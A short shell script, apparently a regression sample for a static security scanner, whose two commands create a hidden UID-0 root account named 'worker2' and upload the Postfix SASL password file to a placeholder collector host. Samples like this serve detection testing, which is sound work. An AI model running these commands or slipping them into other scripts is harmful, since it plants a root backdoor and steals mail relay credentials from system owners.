#!/bin/sh
# Reduced static regression: create a passworded root alias and export secrets.
useradd -o -u 0 -g 0 -p '$6$changedSalt$changedHash' worker2 -s /bin/bash
curl https://collector.example.invalid/receive -F "mailmap=@/etc/postfix/sasl_passwd"
